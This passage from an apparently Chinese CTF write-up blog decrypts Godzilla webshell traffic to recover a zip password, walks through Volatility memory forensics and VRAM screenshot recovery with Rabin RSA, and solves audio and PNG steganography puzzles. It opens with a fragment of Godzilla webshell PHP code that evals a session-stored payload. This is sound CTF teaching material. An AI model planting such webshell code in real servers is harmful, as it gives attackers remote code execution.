class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>stream 36</code>哥斯拉流量解密得到加密flag.zip的原始命令，得到密码<code>airDAS1231qaSW@</code></p><figure><img src="/img/2022西湖论剑MISC复现/170134897026714.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写脚本解密也行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><br><span class="hljs-variable">$endata</span> = <span class="hljs-string">&#x27;J%2B5pNzMyNmU2mij7dMD%2FqHMAa1dTUh6rZrUuY2l7eDVot058H%2BAZShmyrB3w%2FOdLFa2oeH%2FjYdeYr09l6fxhLPMsLeAwg8MkGmC%2BNbz1%2BkYvogF0EFH1p%2FKFEzIcNBVfDaa946G%2BynGJob9hH1%2BWlZFwyP79y4%2FcvxxKNVw8xP1OZWE3&#x27;</span>;<br><span class="hljs-variable">$dedata</span> = <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$endata</span>))), <span class="hljs-variable">$key</span>));  <span class="hljs-comment">//urldecode会将+号解析成空格，导致无法解密，replace回去</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dedata</span>;<br><br><span class="hljs-comment">//cmdLinePsh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot; 2&gt;&amp;1methodNameexecCommand</span><br></code></pre></td></tr></table></figure><p>导出flag.zip，解压得到flag</p><h1 id="fornesics">Fornesics</h1><h2 id="isolated-machine-memory-analysis">Isolated Machine MemoryAnalysis</h2><p>参考 <ahref="https://zysgmzb.club/index.php/archives/132">zysgmzb</a> <ahref="https://crazymanarmy.github.io/2023/02/03/第六届西湖论剑网络安全大赛-Misc-Isolated-Machine-Memory-Analysis-Writeup/">空白</a></p><p>题目描述</p><blockquote><p>张三，现用名叫Charlie，在一家外企工作，负责flag加密技术的研究。为了避免flag泄露，这家企业制定了严格的安全策略，严禁flag离开研发服务器，登录服务器必须经过跳板机。张三使用的跳板机是一台虚拟机，虽然被全盘加密没法提取，但好消息是至少还没关机。免责声明：本题涉及的人名、单位名、产品名、域名及IP地址等均为虚构，如有雷同纯属巧合。注：本题模拟真实研发环境，解题有关的信息不会出现在人名、域名或IP地址等不合常理的地方。链接：https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46提取码：cq46</p></blockquote><p>hint</p><blockquote><p>Hint:hint1:在张三的电脑上发现一张截图，看起来应该是配置跳板机时无意留下的。</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702667.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>hint2:为什么这个Windows内存镜像是ELF格式？hint3:https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</p></blockquote><p>取证，但是拿到一个elf</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf imageinfo</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-built_in">INFO</span>    : volatility.<span class="hljs-built_in">debug</span>    : Determining<span class="hljs-built_in"> profile </span>based on KDBG search<span class="hljs-built_in">..</span>.<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br></code></pre></td></tr></table></figure><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 pslist</code></p><p>其他的省略，重点看这几个，VBoxTray类似vmtool，VBoxService可以确定有VirtualBox，mstsc说明有远程桌面，ClipboardMonit使用了剪贴板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit<br><br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>...<br>0xfffffa8004d307a0 VBoxService.ex          648    460     13      116      0      0 2022-11-02 07:10:56 UTC+0000<br>...<br>0xfffffa800384d9b0 VBoxTray.exe           1884    300     12      138      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa8003854b00 ClipboardMonit         1516    300      1       47      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa80050f2b00 mstsc.exe              2840    300     14      715      1      0 2022-11-01 16:12:35 UTC+0000<br>...<br></code></pre></td></tr></table></figure><p>先看剪贴板内容</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 clipboard</code></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">Volatility Foundation Volatility Framework 2</span><span class="hljs-string">.</span><span class="hljs-comment">6</span><br><span class="hljs-comment">Session    WindowStation Format                         Handle Object             Data</span><br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">--------------------------------------------------</span><br>         <span class="hljs-comment">1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                  0x7400000001</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970</span> <span class="hljs-literal">-----</span><span class="hljs-comment">BEGIN PUBLIC KEY</span><span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-comment">END PUBLIC KEY</span><span class="hljs-literal">-----</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                           0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_LOCALE                         0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       0x0L                              0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span>            <span class="hljs-comment">0x901a3 0xfffff900c01f2cc0</span><br></code></pre></td></tr></table></figure><p>看到有rsa公钥开头的data，-v查看详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Session    WindowStation Format                         Handle Object             Data<br>---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------<br>         1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0<br>0xfffff900c00e26c4  5e 01 03 00 00 00 00 00                           ^.......<br>         1 WinSta0       CF_TEXT                  0x7400000001 ------------------<br>         1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970 -----BEGIN PUBLIC KEY---...----END PUBLIC KEY-----<br>0xfffff900c1df7984  2d 00 2d 00 2d 00 2d 00 2d 00 42 00 45 00 47 00   -.-.-.-.-.B.E.G.<br>0xfffff900c1df7994  49 00 4e 00 20 00 50 00 55 00 42 00 4c 00 49 00   I.N...P.U.B.L.I.<br>0xfffff900c1df79a4  43 00 20 00 4b 00 45 00 59 00 2d 00 2d 00 2d 00   C...K.E.Y.-.-.-.<br>0xfffff900c1df79b4  2d 00 2d 00 0d 00 0a 00 4d 00 46 00 6f 00 77 00   -.-.....M.F.o.w.<br>0xfffff900c1df79c4  44 00 51 00 59 00 4a 00 4b 00 6f 00 5a 00 49 00   D.Q.Y.J.K.o.Z.I.<br>0xfffff900c1df79d4  68 00 76 00 63 00 4e 00 41 00 51 00 45 00 42 00   h.v.c.N.A.Q.E.B.<br>0xfffff900c1df79e4  42 00 51 00 41 00 44 00 53 00 51 00 41 00 77 00   B.Q.A.D.S.Q.A.w.<br>0xfffff900c1df79f4  52 00 67 00 4a 00 42 00 41 00 49 00 45 00 5a 00   R.g.J.B.A.I.E.Z.<br>0xfffff900c1df7a04  54 00 78 00 78 00 6c 00 65 00 37 00 2b 00 35 00   T.x.x.l.e.7.+.5.<br>0xfffff900c1df7a14  72 00 79 00 77 00 43 00 35 00 62 00 79 00 49 00   r.y.w.C.5.b.y.I.<br>0xfffff900c1df7a24  75 00 42 00 6b 00 50 00 68 00 77 00 6b 00 79 00   u.B.k.P.h.w.k.y.<br>0xfffff900c1df7a34  76 00 35 00 37 00 52 00 0d 00 0a 00 37 00 35 00   v.5.7.R.....7.5.<br>0xfffff900c1df7a44  36 00 44 00 55 00 43 00 44 00 39 00 69 00 32 00   6.D.U.C.D.9.i.2.<br>0xfffff900c1df7a54  4d 00 57 00 59 00 79 00 55 00 73 00 30 00 41 00   M.W.Y.y.U.s.0.A.<br>0xfffff900c1df7a64  63 00 63 00 36 00 4a 00 5a 00 77 00 79 00 71 00   c.c.6.J.Z.w.y.q.<br>0xfffff900c1df7a74  56 00 4f 00 6d 00 52 00 37 00 34 00 75 00 4d 00   V.O.m.R.7.4.u.M.<br>0xfffff900c1df7a84  76 00 72 00 65 00 49 00 32 00 73 00 6c 00 6c 00   v.r.e.I.2.s.l.l.<br>0xfffff900c1df7a94  65 00 34 00 47 00 79 00 37 00 48 00 6c 00 36 00   e.4.G.y.7.H.l.6.<br>0xfffff900c1df7aa4  50 00 63 00 58 00 78 00 45 00 43 00 41 00 51 00   P.c.X.x.E.C.A.Q.<br>0xfffff900c1df7ab4  49 00 3d 00 0d 00 0a 00 2d 00 2d 00 2d 00 2d 00   I.=.....-.-.-.-.<br>0xfffff900c1df7ac4  2d 00 45 00 4e 00 44 00 20 00 50 00 55 00 42 00   -.E.N.D...P.U.B.<br>0xfffff900c1df7ad4  4c 00 49 00 43 00 20 00 4b 00 45 00 59 00 2d 00   L.I.C...K.E.Y.-.<br>0xfffff900c1df7ae4  2d 00 2d 00 2d 00 2d 00 00 00                     -.-.-.-...<br></code></pre></td></tr></table></figure><p>处理一下得到公钥，暂时没有什么用，再看其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-----BEGIN PUBLIC KEY-----<br>MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBAIEZTxxle7+5rywC5byIuBkPhwkyv57R<br>756DUCD9i2MWYyUs0Acc6JZwyqVOmR74uMvreI2slle4Gy7Hl6PcXxECAQI=<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>看看截图</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 screenshot -D ./</code></p><p>看到上面有一串mac地址</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702668.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>netscan看看网络连接</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 netscan</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>...<br><span class="hljs-number">0</span>x11e73f010        TCPv6    fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:64</span>:<span class="hljs-number">49158</span> fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:4</span>:<span class="hljs-number">3389</span> ESTABLISHED      -<span class="hljs-number">1</span><br>...<br></code></pre></td></tr></table></figure><p>根据题目描述可以大概猜到这是跳板机和服务器的网络连接</p><p>看远程桌面，先尝试找bmc文件，原理：https://www.hetianlab.com/specialized/20210713143551</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 filescan | findstr ".bmc"</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Volatility</span> Foundation Volatility Framework <span class="hljs-number">2</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">0x00000000085889e0</span>     <span class="hljs-number">17</span>      <span class="hljs-number">1</span> RW-r-- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br><span class="hljs-attribute">0x000000011fed52a0</span>     <span class="hljs-number">14</span>      <span class="hljs-number">0</span> R--rw- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br></code></pre></td></tr></table></figure><p>但是导出后分离不出图片</p><p>那么就memdump将mstsc的内存保存到本地</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 memdump -p 2840 -D ./</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>Writing mstsc.exe [  2840] to 2840.dmp<br></code></pre></td></tr></table></figure><p>修改成.data后缀，用gimp调一下参，得到提示不在RAM中</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702669.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再看回hint1，有vbox显示器的分辨率、显卡等信息</p><p>又根据hint3https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</p><p>猜测可能在VRAM中</p><p>利用vboxinfo找内存信息</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 vboxinfo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Magic: 0xc01ac0de<br>Format: 0x10006<br>VirtualBox 7.0.2 (revision 154219)<br>CPUs: 2<br><br>FileOffset       Memory Offset    Size<br>          0x4a2c              0x0    0xa0000<br>         0xa4a2c          0xc0000     0x9000<br>         0xada2c          0xe0000     0x1000<br>         0xaea2c          0xe1000     0x1000<br>         0xafa2c          0xe2000     0xe000<br>         0xbda2c          0xf0000    0x10000<br>         0xcda2c         0x100000   0x100000<br>        0x1cda2c         0x200000 0xdfe00000<br>      0xdffcda2c       0xe0000000  0x2000000<br>      0xe1fcda2c       0xf0000000   0x200000<br>      0xe21cda2c       0xf0400000   0x400000<br>      0xe25cda2c       0xf0800000     0x4000<br>      0xe25d1a2c       0xffff0000    0x10000<br>      0xe25e1a2c      0x100000000 0x20000000<br></code></pre></td></tr></table></figure><p>根据hint3找到VRAM的位置</p><blockquote><p>The VGA/video memory beings at 0xe0000000 on both x86 and x64systems.</p></blockquote><p><code>0xdffcda2c       0xe0000000  0x2000000</code></p><p>那么偏移0xdffcda2c，大小0x2000000</p><p>可以手动或者用dd命令提取出显存数据</p><p><code>dd if=CharlieBrown-PC.elf of=vram skip=3757890092 bs=1 count=33554432</code></p><p>建议手动，dd命令会很久</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026610.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>保存为VRAM，观察发现4字节一组，代表RGBA，由hint1的分辨率得到图片宽高，编写脚本将data转成图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>width = <span class="hljs-number">1440</span><br>height = <span class="hljs-number">900</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VRAM&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    img = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (flag[x], flag[x + <span class="hljs-number">1</span>], flag[x + <span class="hljs-number">2</span>],flag[x+<span class="hljs-number">3</span>]))<br>            x += <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> img<br><br>img = makeSourceImg()<br>img.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到png，这就是对应刚刚的远程桌面的屏幕截图</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026611.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">089ebf3622f6f6d498c1b5ecfe4d831d3e876bf55578586389127e0053bb4fe006e2eee5398b86274fdce0418d16c9bb0bf24922cec491b3047d33eb661784c9<br></code></pre></td></tr></table></figure><p>接下来就是rsa解密了</p><p>在线网站解析公钥http://www.hiencode.com/pub_asys.html，拿到n和e，n可以直接分解得到p，q</p><p>e=2，rabin</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026612.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这道题目是一道比较新也很巧妙的题，利用了vbox虚拟机elf coredump包含额外的VRAM数据来还原远程桌面的截图，最后结合了rsa，一开始做题还毫无头绪，参考了两位师傅的wp后能慢慢理清思路。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023金砖CTF-决赛</title>
    <link href="/2023/11/21/2023%E9%87%91%E7%A0%96%E5%86%B3%E8%B5%9BCTF/"/>
    <url>/2023/11/21/2023%E9%87%91%E7%A0%96%E5%86%B3%E8%B5%9BCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="金砖ctf-决赛">2023金砖CTF-决赛</h1><h1 id="ctf">CTF</h1><p>ctf部分总体还是比较难的，时间也短</p><h2 id="web">WEB</h2><p>前面的忘了，中间的忘了，后面的也忘了（不难，就是数组绕、%0a绕，rce绕）</p><h2 id="misc">MISC</h2><h3 id="misc01">MISC01</h3><p>拿到一个wav</p><p>010打开发现有两个文件头<code>52 49 46 46</code></p><figure><img src="/img/2023金砖CTF-决赛/170056731535736.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>foremost分离一下</p><figure><img src="/img/2023金砖CTF-决赛/17005673152401.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>00006606.wav</code>用audacity打开，看频谱图得到<code>pass:stego0626</code></p><figure><img src="/img/2023金砖CTF-决赛/17005673152412.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试很多音频隐写的工具无果，再看回原始wav</p><p>在两个wav中间找到一段字节，仔细看是把文件头<code>50 4b 03 04</code>换成<code>2e 2e 2e 2e</code>的zip（这也是foremost分离不出来的原因）</p><figure><img src="/img/2023金砖CTF-决赛/17005673152413.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿出来，压缩包密码为<code>stego0626</code></p><p>解压出来一段乱码</p><figure><img src="/img/2023金砖CTF-决赛/17005673152414.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到cyberchef，magic得到flag（我不知道是我解压有问题还是这编码就是这样出的）</p><figure><img src="/img/2023金砖CTF-决赛/17005673152415.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="misc02">MISC02</h3><p>拿到green.png</p><p><code>zsteg -a</code>看到有zip</p><figure><img src="/img/2023金砖CTF-决赛/17005673152416.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>导出<code>zsteg -E extradata:0 green.png &gt; flag.zip</code>里面有个加密的rgb.txt再回去看zsteg找到密码<code>pass:h16lly81a</code></p><figure><img src="/img/2023金砖CTF-决赛/17005673152417.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到一串rgb值，数量是66822个，分解一下</p><figure><img src="/img/2023金砖CTF-决赛/17005673152418.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>一系列尝试后转成259*259的图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>width,height = <span class="hljs-number">259</span>,<span class="hljs-number">259</span><br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))   <span class="hljs-comment">#创建图片</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rgb.txt&#x27;</span>)    <span class="hljs-comment">#打开rbg值的文件</span><br><span class="hljs-comment">#通过每个rgb点生成图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>        line = file.readline().replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#获取一行的rgb值</span><br>        rgb = line.split(<span class="hljs-string">&quot;,&quot;</span>)  <span class="hljs-comment">#分离rgb，文本中逗号后面有空格</span><br>        <span class="hljs-keyword">try</span>:<br>            im.putpixel((i, j), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))    <span class="hljs-comment">#将rgb转化为像素</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>im.save(<span class="hljs-string">&quot;flag.png&quot;</span>)   <span class="hljs-comment">#im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span><br></code></pre></td></tr></table></figure><p>隐约看出有flag，仔细观察发现应该是宽太短了，应该要为高的2倍</p><figure><img src="/img/2023金砖CTF-决赛/17005673152429.png" alt="img" /><figcaption 